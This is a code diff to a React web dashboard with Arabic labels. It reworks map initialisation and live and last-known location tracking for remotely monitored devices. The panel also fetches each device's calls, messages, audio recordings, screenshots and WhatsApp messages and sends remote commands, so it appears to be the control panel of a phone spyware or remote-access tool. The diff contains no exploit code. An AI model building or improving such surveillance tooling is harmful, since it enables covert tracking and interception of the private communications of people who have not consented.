@@ -48,7 +48,7 @@
             const [selectedDevice, setSelectedDevice] = useState(null);
             const [ws, setWs] = useState(null);
             const [connectionStatus, setConnectionStatus] = useState("جارٍ الاتصال...");
-            const [deviceStates, setDeviceStates] = useState({}); // حالة منفصلة لكل جهاز
+            const [deviceStates, setDeviceStates] = useState({});
             const [messages, setMessages] = useState([]);
             const [calls, setCalls] = useState([]);
             const [commandResults, setCommandResults] = useState({});
@@ -57,6 +57,7 @@
             const [locations, setLocations] = useState([]);
             const [audioRecordings, setAudioRecordings] = useState([]);
             const [whatsAppMessages, setWhatsAppMessages] = useState([]);
+            const [mapType, setMapType] = useState("standard");
             const mapRef = useRef(null);
             const mapInstance = useRef(null);
             const markerRef = useRef(null);
@@ -66,6 +67,7 @@
             const baseReconnectDelay = 5000;
             const pollingIntervalRef = useRef(null);
             const selectedDeviceRef = useRef(null);
+            const [isMapLoaded, setIsMapLoaded] = useState(false);
 
             const isValidJSON = (str) => {
                 try {
@@ -90,67 +92,81 @@
                 });
             };
 
-            const initializeMap = (lat, lng) => {
-                if (!mapRef.current) return;
+            const initializeMap = (lat = 0, lng = 0) => {
+                if (!mapRef.current || !window.L) {
+                    console.error("Map initialization failed: mapRef or Leaflet not available");
+                    return;
+                }
                 if (mapInstance.current) {
                     mapInstance.current.remove();
                     mapInstance.current = null;
                 }
-                mapInstance.current = L.map(mapRef.current, { zoomControl: true }).setView([lat || 0, lng || 0], lat && lng ? 13 : 2);
-                
-                const standardLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    maxZoom: 19,
-                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
-                });
+                try {
+                    mapInstance.current = L.map(mapRef.current, { zoomControl: true }).setView([lat, lng], lat && lng ? 13 : 2);
+                    
+                    const standardLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        maxZoom: 19,
+                        attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+                    });
 
-                const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
-                    maxZoom: 19,
-                    attribution: 'Tiles © Esri — Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
-                });
+                    const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+                        maxZoom: 19,
+                        attribution: 'Tiles © Esri — Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
+                    });
 
-                const baseMaps = {
-                    "خريطة عادية": standardLayer,
-                    "قمر صناعي": satelliteLayer
-                };
+                    const baseMaps = {
+                        "خريطة عادية": standardLayer,
+                        "قمر صناعي": satelliteLayer
+                    };
 
-                standardLayer.addTo(mapInstance.current);
-                L.control.layers(baseMaps).addTo(mapInstance.current);
+                    if (mapType === "standard") {
+                        standardLayer.addTo(mapInstance.current);
+                    } else {
+                        satelliteLayer.addTo(mapInstance.current);
+                    }
+                    L.control.layers(baseMaps).addTo(mapInstance.current);
 
-                const customIcon = L.divIcon({
-                    className: 'custom-marker pulse',
-                    html: '<div style="background: red; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;">📍</div>',
-                    iconSize: [20, 20],
-                    iconAnchor: [10, 10]
-                });
+                    const customIcon = L.divIcon({
+                        className: 'custom-marker pulse',
+                        html: '<div style="background: red; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;">📍</div>',
+                        iconSize: [20, 20],
+                        iconAnchor: [10, 10]
+                    });
 
-                markerRef.current = L.marker([lat || 0, lng || 0], { icon: customIcon, draggable: false })
-                    .addTo(mapInstance.current)
-                    .bindPopup('')
-                    .openPopup();
+                    markerRef.current = L.marker([lat, lng], { icon: customIcon, draggable: false })
+                        .addTo(mapInstance.current)
+                        .bindPopup('')
+                        .openPopup();
+                    console.log("Map initialized at:", lat, lng);
+                    setIsMapLoaded(true);
+                } catch (error) {
+                    console.error("Error initializing map:", error);
+                }
             };
 
             const updateMap = (lat, lng) => {
-                if (mapInstance.current && markerRef.current) {
+                if (mapInstance.current && markerRef.current && lat && lng && !isNaN(lat) && !isNaN(lng) && isMapLoaded) {
                     const newLatLng = L.latLng(lat, lng);
                     markerRef.current.setLatLng(newLatLng);
                     if (!mapInstance.current.getBounds().contains(newLatLng)) {
                         mapInstance.current.setView(newLatLng, 13, { animate: true });
                     }
                     updatePopupTime();
+                } else {
+                    console.error("Invalid coordinates, map not ready, or not loaded for updateMap:", lat, lng, isMapLoaded);
                 }
             };
 
             const updatePopupTime = () => {
                 if (markerRef.current) {
                     const currentState = deviceStates[selectedDevice?.uuid] || {};
-                    markerRef.current.setPopupContent(`الموقع الفعلي<br>التاريخ: ${formatLocalTime(currentState.liveLocation?.captured_at || new Date().toISOString())}`);
+                    markerRef.current.setPopupContent(`الموقع الفعلي<br>التاريخ: ${formatLocalTime(currentState.liveLocation?.captured_at || currentState.lastKnownLocation?.captured_at || new Date().toISOString())}`);
                 }
             };
 
-            const centerMapOnLocation = () => {
-                const currentState = deviceStates[selectedDevice?.uuid] || {};
-                if (currentState.liveLocation && mapInstance.current) {
-                    mapInstance.current.setView([currentState.liveLocation.latitude, currentState.liveLocation.longitude], 13, { animate: true });
+            const centerMapOnLocation = (lat, lng) => {
+                if (mapInstance.current && lat && lng && !isNaN(lat) && !isNaN(lng)) {
+                    mapInstance.current.setView([lat, lng], 13, { animate: true });
                     updatePopupTime();
                 }
             };
@@ -346,10 +362,13 @@
                                         ...prev,
                                         [selectedDeviceRef.current.uuid]: {
                                             ...prev[selectedDeviceRef.current.uuid],
-                                            liveLocation: { latitude: newLat, longitude: newLng, captured_at: data.captured_at || new Date().toISOString() }
+                                            liveLocation: { latitude: newLat, longitude: newLng, captured_at: data.captured_at || new Date().toISOString() },
+                                            lastKnownLocation: { latitude: newLat, longitude: newLng, captured_at: data.captured_at || new Date().toISOString() }
                                         }
                                     }));
-                                    console.log("Updated liveLocation successfully:", newLat, newLng);
+                                    if (deviceStates[selectedDeviceRef.current.uuid]?.isTracking && mapInstance.current && isMapLoaded) {
+                                        updateMap(newLat, newLng);
+                                    }
                                 } else {
                                     console.error("Invalid coordinates out of range:", newLat, newLng);
                                 }
@@ -393,6 +412,18 @@
             };
 
             useEffect(() => {
+                const script = document.createElement('script');
+                script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+                script.async = true;
+                script.onload = () => {
+                    console.log("Leaflet loaded successfully");
+                    if (mapRef.current) {
+                        initializeMap(0, 0);
+                    }
+                };
+                script.onerror = () => console.error("Failed to load Leaflet");
+                document.body.appendChild(script);
+
                 connectWebSocket();
                 startPolling();
                 return () => {
@@ -403,6 +434,7 @@
                         mapInstance.current.remove();
                         mapInstance.current = null;
                     }
+                    document.body.removeChild(script);
                 };
             }, []);
 
@@ -412,42 +444,34 @@
                     if (ws && ws.readyState === WebSocket.OPEN) {
                         ws.send(JSON.stringify({ action: "subscribe_to_device", deviceId: selectedDevice.uuid }));
                         console.log("Subscribed to device:", selectedDevice.uuid);
-                        if (mapInstance.current) {
-                            mapInstance.current.remove();
-                            mapInstance.current = null;
+                        if (mapRef.current && window.L) {
+                            const lastLat = selectedDevice.latitude || 0;
+                            const lastLng = selectedDevice.longitude || 0;
+                            initializeMap(lastLat, lastLng);
                         }
-                        const lastLat = selectedDevice.latitude || 0;
-                        const lastLng = selectedDevice.longitude || 0;
-                        initializeMap(lastLat, lastLng);
                         setDeviceStates(prev => ({
                             ...prev,
                             [selectedDevice.uuid]: {
                                 ...prev[selectedDevice.uuid],
-                                liveLocation: lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: selectedDevice.lastActivity ? new Date(selectedDevice.lastActivity).toISOString() : new Date().toISOString() } : null,
-                                isTracking: prev[selectedDevice.uuid]?.isTracking || false
+                                liveLocation: selectedDevice.latitude && selectedDevice.longitude && !isNaN(selectedDevice.latitude) && !isNaN(selectedDevice.longitude) ? { latitude: selectedDevice.latitude, longitude: selectedDevice.longitude, captured_at: selectedDevice.lastActivity ? new Date(selectedDevice.lastActivity).toISOString() : new Date().toISOString() } : null,
+                                lastKnownLocation: selectedDevice.latitude && selectedDevice.longitude && !isNaN(selectedDevice.latitude) && !isNaN(selectedDevice.longitude) ? { latitude: selectedDevice.latitude, longitude: selectedDevice.longitude, captured_at: selectedDevice.lastActivity ? new Date(selectedDevice.lastActivity).toISOString() : new Date().toISOString() } : null,
+                                isTracking: false
                             }
                         }));
                     }
-                } else if (!selectedDevice && mapInstance.current) {
-                    mapInstance.current.remove();
-                    mapInstance.current = null;
+                } else if (mapRef.current && window.L) {
+                    initializeMap(0, 0);
                 }
             }, [selectedDevice, ws]);
 
             useEffect(() => {
                 const currentState = deviceStates[selectedDevice?.uuid] || {};
-                console.log("liveLocation:", currentState.liveLocation, "isTracking:", currentState.isTracking);
-                if (currentState.liveLocation && mapInstance.current && markerRef.current && currentState.isTracking) {
-                    console.log("Updating map with live location:", currentState.liveLocation.latitude, currentState.liveLocation.longitude);
+                if (currentState.liveLocation && mapInstance.current && markerRef.current && isMapLoaded && currentState.isTracking) {
                     updateMap(currentState.liveLocation.latitude, currentState.liveLocation.longitude);
-                } else if (mapInstance.current && markerRef.current && selectedDevice) {
-                    const lastLat = selectedDeviceRef.current?.latitude || 0;
-                    const lastLng = selectedDeviceRef.current?.longitude || 0;
-                    markerRef.current.setLatLng([lastLat, lastLng]);
-                    mapInstance.current.setView([lastLat, lastLng], lastLat && lastLng ? 13 : 2);
-                    updatePopupTime();
+                } else if (mapInstance.current && markerRef.current && selectedDevice && !currentState.isTracking && currentState.lastKnownLocation) {
+                    updateMap(currentState.lastKnownLocation.latitude, currentState.lastKnownLocation.longitude);
                 }
-            }, [deviceStates, selectedDevice]);
+            }, [deviceStates, selectedDevice, isMapLoaded]);
 
             useEffect(() => {
                 const currentState = deviceStates[selectedDevice?.uuid] || {};
@@ -455,13 +479,14 @@
                     startTimeUpdate();
                 } else {
                     stopTimeUpdate();
-                    if (markerRef.current) {
+                    if (markerRef.current && currentState.lastKnownLocation) {
                         updatePopupTime();
                     }
                 }
             }, [deviceStates, selectedDevice]);
 
             const selectDevice = (device) => {
+                console.log("Selecting device:", device.uuid);
                 setSelectedDevice(device);
                 setMessages([]);
                 setCalls([]);
@@ -473,19 +498,22 @@
                 setWhatsAppMessages([]);
                 const lastLat = device.latitude || 0;
                 const lastLng = device.longitude || 0;
-                if (mapInstance.current) {
-                    mapInstance.current.remove();
-                    mapInstance.current = null;
-                }
-                initializeMap(lastLat, lastLng);
-                setDeviceStates(prev => ({
-                    ...prev,
-                    [device.uuid]: {
-                        ...prev[device.uuid],
-                        liveLocation: lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: device.lastActivity ? new Date(device.lastActivity).toISOString() : new Date().toISOString() } : null,
-                        isTracking: false
+                if (mapRef.current && window.L) {
+                    initializeMap(lastLat, lastLng);
+                    if (!isNaN(lastLat) && !isNaN(lastLng)) {
+                        setDeviceStates(prev => ({
+                            ...prev,
+                            [device.uuid]: {
+                                ...prev[device.uuid],
+                                liveLocation: lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: device.lastActivity ? new Date(device.lastActivity).toISOString() : new Date().toISOString() } : null,
+                                lastKnownLocation: lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: device.lastActivity ? new Date(device.lastActivity).toISOString() : new Date().toISOString() } : null,
+                                isTracking: false
+                            }
+                        }));
+                    } else {
+                        console.error("Invalid latitude or longitude for device:", device.uuid, lastLat, lastLng);
                     }
-                }));
+                }
                 fetchLocations(device.uuid);
                 fetchAudioRecordings(device.uuid);
                 fetchCalls(device.uuid);
@@ -493,6 +521,7 @@
                 fetchScreenshots(device.uuid);
                 fetchPeriodicScreenshots(device.uuid);
                 fetchWhatsAppMessages(device.uuid);
+                console.log("Device selected and map initialized:", device.uuid);
             };
 
             const sendCommand = (command) => {
@@ -516,7 +545,8 @@
                         ...prev,
                         [selectedDevice.uuid]: {
                             ...prev[selectedDevice.uuid],
-                            liveLocation: { latitude: lastLat, longitude: lastLng, captured_at: new Date().toISOString() }
+                            liveLocation: { latitude: lastLat, longitude: lastLng, captured_at: new Date().toISOString() },
+                            lastKnownLocation: { latitude: lastLat, longitude: lastLng, captured_at: new Date().toISOString() }
                         }
                     }));
                     if (mapInstance.current) {
@@ -540,16 +570,21 @@
                 if (ws && ws.readyState === WebSocket.OPEN && selectedDevice && deviceStates[selectedDevice.uuid]?.isTracking) {
                     ws.send(JSON.stringify({ action: "stop_live_tracking", deviceId: selectedDevice.uuid }));
                     const currentState = deviceStates[selectedDevice.uuid] || {};
+                    const lastLat = currentState.liveLocation?.latitude || currentState.lastKnownLocation?.latitude || 0;
+                    const lastLng = currentState.liveLocation?.longitude || currentState.lastKnownLocation?.longitude || 0;
                     setDeviceStates(prev => ({
                         ...prev,
-                        [selectedDevice.uuid]: { ...prev[selectedDevice.uuid], isTracking: false }
+                        [selectedDevice.uuid]: {
+                            ...prev[selectedDevice.uuid],
+                            isTracking: false,
+                            lastKnownLocation: { latitude: lastLat, longitude: lastLng, captured_at: currentState.liveLocation?.captured_at || new Date().toISOString() }
+                        }
                     }));
-                    if (mapInstance.current && markerRef.current && currentState.liveLocation) {
-                        markerRef.current.setLatLng([currentState.liveLocation.latitude, currentState.liveLocation.longitude]);
-                        mapInstance.current.setView([currentState.liveLocation.latitude, currentState.liveLocation.longitude], 13, { animate: true });
-                        updatePopupTime();
+                    if (mapInstance.current && markerRef.current) {
+                        updateMap(lastLat, lastLng);
+                        centerMapOnLocation(lastLat, lastLng);
                     }
-                    console.log("Stopped live tracking for device:", selectedDevice.uuid);
+                    console.log("Stopped live tracking for device:", selectedDevice.uuid, "at", lastLat, lastLng);
                 }
             };
 
@@ -635,8 +670,11 @@
                                         إيقاف التتبع
                                     </button>
                                     <button
-                                        onClick={() => centerMapOnLocation()}
-                                        disabled={!deviceStates[selectedDevice?.uuid]?.liveLocation}
+                                        onClick={() => {
+                                            const currentState = deviceStates[selectedDevice?.uuid] || {};
+                                            centerMapOnLocation(currentState.lastKnownLocation?.latitude || 0, currentState.lastKnownLocation?.longitude || 0);
+                                        }}
+                                        disabled={!deviceStates[selectedDevice?.uuid]?.lastKnownLocation}
                                         className="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600 transition duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
                                     >
                                         الرجوع إلى الموقع
@@ -650,9 +688,9 @@
                                         <option value="satellite">قمر صناعي</option>
                                     </select>
                                 </div>
-                                <div ref={mapRef} className="w-full h-96 rounded-lg overflow-hidden" style={{ position: 'relative' }}></div>
+                                <div ref={mapRef} className="w-full h-96 rounded-lg overflow-hidden" style={{ position: 'relative', minHeight: '400px' }}></div>
                                 <p className="mt-2 text-gray-600">
-                                    آخر تحديث: {formatLocalTime(deviceStates[selectedDevice?.uuid]?.liveLocation?.captured_at || new Date().toISOString())}
+                                    آخر تحديث: {formatLocalTime(deviceStates[selectedDevice?.uuid]?.liveLocation?.captured_at || deviceStates[selectedDevice?.uuid]?.lastKnownLocation?.captured_at || new Date().toISOString())}
                                 </p>
                             </div>
 
@@ -939,6 +977,5 @@
         const root = ReactDOM.createRoot(document.getElementById("root"));
         root.render(<App />);
     </script>
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </body>
 </html>
